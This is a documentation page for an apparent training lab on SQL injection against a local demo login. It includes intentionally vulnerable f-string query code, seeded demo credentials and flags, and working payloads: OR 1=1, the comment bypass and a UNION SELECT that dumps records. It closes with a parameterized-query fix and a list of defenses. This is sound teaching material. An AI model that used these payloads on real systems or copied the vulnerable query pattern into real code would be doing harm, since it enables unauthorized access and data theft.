---
id: sql-injection
title: SQL Injection
sidebar_position: 1
---

# 💉 SQL Injection

SQL Injection (SQLi) is one of the most critical and widespread web vulnerabilities. It occurs when user-supplied input is concatenated directly into a SQL query, allowing an attacker to alter the query's logic.

---

## The Vulnerability

The login form in CyberSim is intentionally built with string formatting instead of parameterized queries:

```python title="app.py — Vulnerable code"
# INTENTIONALLY VULNERABLE — educational demo only
query = (
    f"SELECT id, username, role, secret FROM demo_users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
conn.execute(query)
```

When `username` is set to `admin'--`, the resulting query becomes:

```sql
SELECT id, username, role, secret FROM demo_users
WHERE username = 'admin'--' AND password = ''
--                          ↑ everything after -- is a comment
```

The `AND password = ''` condition is commented out entirely — the attacker logs in as `admin` with no password.

---

## The Demo Database

The challenge runs against a local SQLite database seeded with three accounts:

| ID | Username | Password | Role | Secret |
|---|---|---|---|---|
| 1 | `admin` | `super_secret_pass` | admin | `FLAG{sql_injection_master}` |
| 2 | `alice` | `alice_pass` | user | `flag{alice_secret}` |
| 3 | `bob` | `bob_pass` | user | `flag{bob_secret}` |

Your goal is to extract these records without knowing the passwords.

---

## Payloads to Try

The payload table in the challenge UI is clickable — click any row to auto-fill the form.

### Basic auth bypass

```
Username: ' OR '1'='1
Password: anything
```

The query becomes:
```sql
WHERE username = '' OR '1'='1' AND password = 'anything'
```
`'1'='1'` is always true → all rows returned.

---

### Comment bypass (most elegant)

```
Username: admin'--
Password: (leave empty)
```

The query becomes:
```sql
WHERE username = 'admin'--' AND password = ''
```
Password check is commented out → logs in as admin directly.

---

### OR with comment

```
Username: ' OR 1=1--
Password: x
```

The query becomes:
```sql
WHERE username = '' OR 1=1--' AND password = 'x'
```
`1=1` is always true → all rows returned, password check dropped.

---

### UNION attack (advanced)

```
Username: ' UNION SELECT 1,username,role,secret FROM demo_users--
Password: x
```

A `UNION` attack appends a second `SELECT` to the original query, returning data from any table or column you specify. This technique is used in real-world attacks to exfiltrate entire databases.

:::tip Live Query Preview
As you type in the username or password field, the generated SQL query updates in real time below the form. Injection points are highlighted in **red** so you can see exactly where your input breaks the string boundary.
:::

---

## Scoring

| Achievement | Condition | Points |
|---|---|---|
| First Injection | Any successful result returned | +10 |
| Auth Bypass | `OR`-based technique | +20 |
| Comment Killer | `--` comment bypass | +30 |
| UNION Master | `UNION` attack succeeds | +50 |
| SQLi Scholar | Read the defense guide | +15 |

Maximum: **100 pts** (capped)

---

## The Fix — Parameterized Queries

```python title="app.py — Secure version"
query = (
    "SELECT id, username, role, secret FROM demo_users "
    "WHERE username = ? AND password = ?"
)
conn.execute(query, (username, password))
# ↑ The ? placeholders are filled by the database driver,
#   which treats the values as DATA — never as SQL syntax.
#   Single quotes, dashes, UNION — all safely escaped automatically.
```

### Additional defenses

| Defense | How it helps |
|---|---|
| **Parameterized queries / prepared statements** | Input is never interpreted as SQL |
| **Input validation** | Reject characters like `'`, `--`, `;` at the boundary |
| **Least privilege** | Database user should only `SELECT` — never `DROP` or `UPDATE` |
| **ORM (SQLAlchemy, Django ORM)** | Abstracts raw SQL, parameterizes by default |
| **Web Application Firewall (WAF)** | Detects and blocks common injection patterns |

---

## Real-World Impact

SQL injection has been responsible for some of the largest data breaches in history:

- **Heartland Payment Systems (2008)** — 130 million credit cards stolen
- **Sony Pictures (2011)** — 1 million user accounts exposed
- **Yahoo (2012)** — 450,000 credentials stolen

It consistently ranks in the [OWASP Top 10](https://owasp.org/www-project-top-ten/) as one of the most critical web application security risks.

---

## Further Reading

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [SQLite Query Docs](https://www.sqlite.org/lang_select.html)
